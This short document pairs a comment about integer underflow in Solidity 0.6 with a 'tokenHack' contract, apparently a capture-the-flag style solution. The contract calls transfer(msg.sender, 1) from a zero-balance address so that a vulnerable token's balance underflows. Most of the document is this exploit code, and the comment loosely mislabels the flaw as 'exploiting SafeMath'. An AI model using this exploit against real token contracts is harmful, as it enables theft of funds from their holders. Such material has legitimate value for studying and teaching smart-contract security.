// we are exploiting SafeMath for solidity 0.6. Underflows and overflows.
In solidity 0.6 SafeMath was not enabled, which means we wil be able to perform underflows and overflows without a problem.

ex: If we have a balance of zero and then we put in a value of lets say 1. (0 - 1) will underflow. 



pragma solidity ^0.8.0;

interface IToken {
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    
}

contract tokenHack {
    constructor(address _tokenContract) {
        IToken(_tokenContract).transfer(msg.sender, 1);
    }
}
